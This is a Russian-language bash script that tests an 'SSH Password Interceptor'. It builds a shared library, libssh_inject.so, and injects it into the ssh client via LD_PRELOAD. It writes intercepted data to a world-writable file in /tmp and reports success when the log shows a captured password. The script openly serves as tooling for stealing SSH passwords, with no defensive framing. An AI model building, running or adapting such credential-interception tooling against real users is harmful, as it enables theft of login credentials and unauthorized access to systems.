#!/bin/bash

# Скрипт для быстрого тестирования SSH Password Interceptor

echo "==== SSH Password Interceptor - Быстрый тест ===="

# Проверка наличия файлов
if [ ! -f "ssh_inject.cpp" ] || [ ! -f "state.hpp" ]; then
    echo "Ошибка: Исходные файлы не найдены. Запустите скрипт из корневой директории репозитория ScrScr."
    exit 1
fi

# Компиляция
echo "1. Компиляция libssh_inject.so..."
make clean &>/dev/null
make &>/dev/null

if [ ! -f "libssh_inject.so" ]; then
    echo "Ошибка: Сборка не удалась. Проверьте наличие компилятора g++ и библиотеки libdl."
    exit 1
else
    echo "   Компиляция успешна!"
fi

# Подготовка лог-файла
echo "2. Подготовка лог-файла..."
sudo rm -f /tmp/ssh_inj.dbg
sudo touch /tmp/ssh_inj.dbg
sudo chmod 666 /tmp/ssh_inj.dbg
echo "   Лог-файл подготовлен: /tmp/ssh_inj.dbg"

# Тестирование
echo "3. Тестовое подключение SSH..."
echo "   Попытка подключения к localhost с перехватом пароля."
echo "   (Нажмите Ctrl+C для отмены, если тест зависнет)"
echo ""
echo "   Запуск: LD_PRELOAD=./libssh_inject.so ssh localhost"
echo "   Введите пароль по запросу..."
echo ""

# Запуск ssh с перехватом
LD_PRELOAD=./libssh_inject.so ssh localhost -o ConnectTimeout=10

# Проверка результатов
echo ""
echo "4. Проверка лог-файла..."
if [ -s /tmp/ssh_inj.dbg ]; then
    echo "   Лог-файл содержит данные:"
    echo "---------------------------------------------------"
    cat /tmp/ssh_inj.dbg
    echo "---------------------------------------------------"
    
    # Проверка, был ли захвачен пароль
    if grep -q "Password captured via strlen" /tmp/ssh_inj.dbg; then
        echo "   ✅ ТЕСТ ПРОЙДЕН: Пароль успешно захвачен!"
    else
        echo "   ⚠️ ВНИМАНИЕ: Лог-файл создан, но пароль не захвачен"
    fi
else
    echo "   ❌ ОШИБКА: Лог-файл пуст или не создан"
fi

echo ""
echo "Тестирование завершено!" 